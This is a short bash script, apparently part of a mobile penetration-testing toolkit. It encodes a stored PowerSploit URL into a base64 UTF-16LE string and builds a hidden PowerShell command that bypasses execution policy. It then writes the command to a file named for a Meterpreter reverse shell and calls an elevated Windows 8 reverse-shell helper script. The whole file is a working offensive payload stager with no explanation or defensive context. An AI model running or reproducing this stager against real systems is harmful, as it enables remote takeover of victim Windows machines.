#!/bin/bash
encode="`cat /sdcard/files/powersploit-url | /usr/bin/iconv --to-code UTF-16LE | /usr/bin/base64 -w 0`"
command=" PowerShell.exe -Exec ByPass -Nol -Enc $encode"
echo " $command" >/sdcard/files/rev-met
/usr/bin/rev-met-elevated-win8.py

